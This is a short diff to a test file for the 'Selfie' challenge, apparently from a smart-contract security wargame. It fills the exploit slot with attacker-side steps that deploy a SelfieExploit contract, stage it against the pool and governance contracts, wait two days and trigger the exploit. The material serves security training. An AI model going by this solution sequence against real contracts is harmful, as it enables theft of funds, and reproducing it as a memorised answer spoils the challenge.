@@ -34,6 +34,11 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const SelfieExploit = contract.fromArtifact('SelfieExploit');
+        this.exploit = await SelfieExploit.new({ from: attacker });
+        await this.exploit.stage(this.token.address, this.pool.address, TOKENS_IN_POOL, this.governance.address, {from:attacker});
+        await time.increase(time.duration.days(2));
+        await this.exploit.exploit({from: attacker});
     });
 
     after(async function () {
